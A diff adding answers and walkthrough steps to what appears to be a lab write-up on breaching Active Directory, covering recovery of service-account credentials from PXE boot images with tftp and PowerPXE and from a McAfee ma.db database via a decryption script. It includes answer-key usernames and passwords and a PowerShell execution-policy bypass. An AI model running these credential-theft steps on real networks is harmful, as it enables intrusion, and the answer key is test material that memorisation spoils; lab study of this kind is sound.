@@ -566,11 +566,54 @@ As you can see, powerpxe was able to recover the AD credentials. We now have ano
 
 * What Microsoft tool is used to create and host PXE Boot images in organisations?
 
+    `Microsoft Deployment Toolkit`
+
 * What network protocol is used for recovery of files from the MDT server?
+
+    `tftp`
 
 * What is the username associated with the account that was stored in the PXE Boot image?
 
+    `svcMDT`
+
+    * Download BCD file and run powershell
+
+        ```
+        tftp -i 10.200.80.202 GET "\Tmp\x64{DB84A6D2-E6DF-499B-A4C7-6FFE2CC8E1BF}.bcd" conf.bcd
+        powershell -executionpolicy bypass
+        ```
+        
+        ![task6-download](./images/task6-download.png)
+
+    * Read the BCD file using Power PXE
+
+        ```
+        Import-Module .\PowerPXE.ps1
+        $BCDFile = "conf.bcd"
+        Get-WimFile -bcdFile $BCDFile
+        ```
+
+        ![task6-powerpxe](./images/task6-powerpxe.png)
+
+    * Download WIM File
+
+        ```
+        tftp -i 10.200.80.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+        ```
+
+        ![task6-download-WIM](./images/task6-download-WIM.png)
+
+    * Get the Credential
+
+        ```
+        Get-FindCredentials -WimFile pxeboot.wim
+        ```
+
+        ![task6-credential](./images/task6-credential.png)
+
 * What is the password associated with the account that was stored in the PXE Boot image?
+
+    `PXEBootSecure1@`
 
 * While you should make sure to cleanup you user directory that you created at the start of the task, if you try you will notice that you get an access denied error. Don't worry, a script will help with the cleanup process but remember when you are doing assessments to always perform cleanup.
 
@@ -625,13 +668,43 @@ We now once again have a set of AD credentials that we can use for further enume
 
 * What type of files often contain stored credentials on hosts?
 
+    `Configuration File`
+
 * What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?
+
+    `ma.db`
 
 * What table in this database stores the credentials of the orchestrator?
 
+    `AGENT_REPOSITORIES`
+
 * What is the username of the AD account associated with the McAfee service?
 
+    `svcAV`
+
 * What is the password of the AD account associated with the McAfee service?
+
+    `MyStrongPassword!`
+
+    * Download file "ma.db"
+        
+        ![task7-download](./images/task7-download.png)
+
+    * Read the database
+
+        ```
+        sqlitebrowser ma.db
+        ```
+
+        ![task7-sqldatabase](./images/task7-sqldatabase.png)
+
+    * Decrypt the AUTH_PASSWD
+
+        ```
+        ./mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+        ```
+
+        ![task7-decrypted](./images/task7-decrypted.png)
 
 ## Task 8 - Conclusion
 
